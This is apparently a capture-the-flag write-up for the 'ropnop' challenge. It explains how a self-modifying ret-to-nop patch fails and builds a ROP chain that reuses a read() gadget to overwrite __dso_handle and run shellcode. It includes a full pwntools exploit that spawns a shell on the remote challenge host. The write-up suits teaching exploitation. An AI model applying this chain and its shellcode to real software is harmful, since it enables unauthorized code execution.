# ropnop

For this challenge we are provided with an ELF binary `ropnop` and its source code `ropnop.c`. The binary is a PIE, but doesn't use stack canaries and has only partial RELRO. Analyzing the source code, it becomes clear that we are gifted the address of the binary and the ability to smash the stack and enter return oriented programming.

The binary tries to prevent us from building a useful ROP chain by overwriting all of its `0xc3` bytes (those are `ret` instructions) with `0x90` bytes (those are `nop` instructions). However, this procedure has a fatal flaw: eventually the code which performs the replacement will perform on itself, replacing the compare with `0xc3` with a compare with `0x90`. Afterwards, no more `ret`s will be overwritten; instead, `nop`s will be replaced with `nop`s.

Despite most ROP gadgets being overwritten by the above procedure, we can still escalate our ROP to code execution, using only one gadget: the call to `read()` in `main()`:

```asm
0x000012c3      488b45f0       mov rax, qword [rbp-0x10]
0x000012c7      4889c6         mov rsi, rax
0x000012ca      ba37130000     mov edx, 0x1337
0x000012cf      e86cfdffff     call sym.imp.read
0x000012d4      31c9           xor ecx, ecx
0x000012d6      488945e8       mov qword [rbp-0x18], rax
0x000012da      89c8           mov eax, ecx
0x000012dc      4883c420       add rsp, 0x20
0x000012e0      5d             pop rbp
0x000012e1      c3             ret
```

This gadget effectively calls `read(edi, *(rbp-0x10), 0x1337)`, followed by `add rsp, 0x20; pop rbp; ret`. Because `edi` is still `0` at this point, we read from standard input. When smashing the stack, we gain control of `rbp`, so we can `read()` to the target of any pointer with a known address.

The perfect target for this `read()` is the last entry of the global offset table, called `__dso_handle`, which always points to itself. Our ROP chain executes the `read` gadget twice, with `rbp-0x10` pointing to `__dso_handle` both times. That allows us to overwrite `__dso_handle` with the first read, and to write to an arbitrary address with the second read. We use this to write shellcode somewhere in the binary (it was remapped rwx by the patching routine), and then return to the shellcode.

Flag: `CSCG{s3lf_m0d1fy1ng_c0dez!}`

Exploit code:

```python
from pwn import *

# start or connect
if args.GDB:
    r = gdb.debug("./ropnop")
    p = pause
elif args.REMOTE:
    r = remote("hax1.allesctf.net", 9300)
    p = lambda: sleep(0.1)
else:
    r = process("./ropnop")
    p = lambda: sleep(0.1)
context.binary = "./ropnop"

# get addresses of binary
r.recvuntil("start:")
start = int(r.recvuntil("- end:", True), 0)
end = int(r.recvline().strip(), 0)
info("start: 0x%x, end: 0x%x", start, end)

# prepare shellcode
sc = asm(shellcraft.sh())
sc_addr = start

# return to read() in main()
main_read = start + 0x12C3
# 0x4040 points to itself (last got entry)
dso_handle = start + 0x4040

chain = flat(
    "A" * 0x10,
    # read(0, *dso_handle, 0x1337) with *dso_handle == dso_handle
    dso_handle + 0x10,
    main_read,
    "B" * 0x20,
    # read(0, *dso_handle, 0x1337) with *dso_handle == sc_addr
    dso_handle + 0x10,
    main_read,
    "C" * 0x28,
    # return to shellcode
    sc_addr,
)

r.send(chain)
p()
r.send(p64(sc_addr))
p()
r.send(sc)
p()
r.sendline('id;uname -a;pwd;ls -al / .;cat fl*')

r.interactive()
```
